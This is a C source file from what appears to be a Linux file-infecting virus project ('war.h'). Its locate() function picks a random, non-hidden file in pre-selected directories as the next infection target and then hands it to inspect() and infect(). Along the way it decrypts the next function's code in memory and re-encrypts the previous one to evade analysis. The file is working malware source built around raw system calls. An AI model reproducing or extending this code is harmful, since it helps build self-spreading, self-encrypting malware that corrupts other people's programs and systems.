#include "war.h"

/*
  Locate search aleatory for uninfected binaries.
  Look at war() func to know which directories are pre-selected.
*/

void	locate(t_data *data, t_directory *dir)
{

#ifdef DEBUG
	char log[] = "locate\t\t";
	_log(log, NULL, 8, data->context);
#endif

	revert_one(&data->key, (char*)war, (size_t)locate - (size_t)war);

	int				fd;
	int				stop;
	int				limit;
	char			buf[BUFF_SIZE] = {0};
	char			path[PATH_MAX] = {0};
	linux_dirent64 *curr = NULL;

	data->context = false;
	if (_memcpy(path, dir->path[dir->entry], _strlen(dir->path[dir->entry])) != path)
		goto next;
	if ((fd = _open(path, O_RDONLY, 0000)) < 0)
		goto next;

   	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
	{
		for (register int i = 0 ; i < limit ; i += curr->d_reclen)
		{
			curr = (struct linux_dirent64 *)(buf + i);
			dir->entry++;
		}
	}

	if (_close(fd) < 0 || dir->entry <= 0)
		goto next;

iter:
	if ((fd = _open(path, O_RDONLY, 0000)) < 0)
		goto next;
	if ((stop = _random_number(dir->entry)) < 0)
		goto next;

	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
	{
		for (register int i = 0 ; i < limit ; i += curr->d_reclen)
		{
			curr = (struct linux_dirent64 *)(buf + i);
			if (stop == 0)
				break ;
			stop--;
		}
		if (stop == 0)
			break ;
	}
	if (_close(fd) < 0)
		goto next;
	if (*curr->d_name == '.')
		goto iter;

	limit = _strlen(path);
	path[limit++] = '/';
	if (_memcpy(path + limit, curr->d_name, _strlen(curr->d_name)) != path + limit)
		goto next;
	data->context = true;

next:
	update_one(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
	revert_one(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
	inspect(data, path);
}
